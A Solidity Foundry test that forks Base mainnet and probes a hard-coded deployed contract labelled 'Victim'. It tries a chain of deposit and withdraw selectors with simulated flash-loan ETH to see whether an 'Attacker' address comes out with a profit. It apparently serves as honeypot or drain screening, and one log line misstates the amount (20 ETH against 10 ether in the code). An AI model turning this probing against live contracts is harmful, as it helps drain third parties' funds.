
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract HoneypotTestETH is Test {
    address victim = 0x63242A4Ea82847b20E506b63B0e2e2eFF0CC6cB0;
    address attacker = address(0x1337);
    
    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org");
        vm.label(victim, "Victim");
        vm.label(attacker, "Attacker");
    }

    function testSafeCycleETH() public {
        vm.startPrank(attacker);
        
        console.log("Contract ETH Balance:", address(victim).balance);

        
        
        uint256 amount = 10 ether; // Flash Loan Amount
        vm.deal(attacker, amount); 
        console.log("Flash Loan Mode: 20 ETH simulated");
        
        uint256 balBefore = attacker.balance;

        // 1. Deposit
        bool success;
        
        // Try deposit() first
        (success, ) = victim.call{value: amount}(abi.encodeWithSignature("deposit()"));
        
        // Flexible entry: Try alternative selectors if standard deposit fails
        if (!success) (success, ) = victim.call{value: amount}("");
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("stake()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("contribute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("enter()"));
        // Try Brute-force/ABI Sniffing
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("execute()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("claim()"));
        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("refund()"));
        // Fallback: Raw call with 1 wei
        if (!success) (success, ) = victim.call{value: 1 wei}("");

        
        
        require(success, "Deposit failed (tried all variants)");
        
        vm.warp(block.timestamp + 86401);
        vm.roll(block.number + 100);
    
        
        // 2. Withdraw
        // Priority: withdraw(uint256) -> withdraw() -> withdrawAll() -> redeem(uint256)
        
        // Try withdraw(uint256)
        (success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        if (success) { _checkProfit(balBefore, "withdraw(uint256)"); vm.stopPrank(); return; }
        
        // Try withdraw() - no args
        (success, ) = victim.call(abi.encodeWithSignature("withdraw()"));
        if (success) { _checkProfit(balBefore, "withdraw()"); vm.stopPrank(); return; }

        // Try withdrawAll()
        (success, ) = victim.call(abi.encodeWithSignature("withdrawAll()"));
        if (success) { _checkProfit(balBefore, "withdrawAll()"); vm.stopPrank(); return; }

        // Try redeem(uint256) - ERC4626 standard
        (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256,address,address)", amount, attacker, attacker));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("redeem(uint256)", amount));
        if (success) { _checkProfit(balBefore, "redeem(uint256)"); vm.stopPrank(); return; }

        // Try leave() / exit()
        (success, ) = victim.call(abi.encodeWithSignature("leave(uint256)", amount));
        if (!success) (success, ) = victim.call(abi.encodeWithSignature("exit()"));
        if (success) { _checkProfit(balBefore, "exit/leave"); vm.stopPrank(); return; }

        require(success, "Withdraw failed (tried all variants)");
        
        vm.stopPrank();
    }

    function _checkProfit(uint256 balBefore, string memory method) internal view {
        uint256 balAfter = attacker.balance;
        int256 profit = int256(balAfter) - int256(balBefore);
        console.log("SUCCESS_METHOD:", method);
        if (profit > 0) {
            console.log("PROFIT_WEI:", uint256(profit));
            console.log("[SIM] Profit found:", uint256(profit), "wei");
        } else {
            console.log("[SIM] No profit or loss detected.");
        }
    }
}
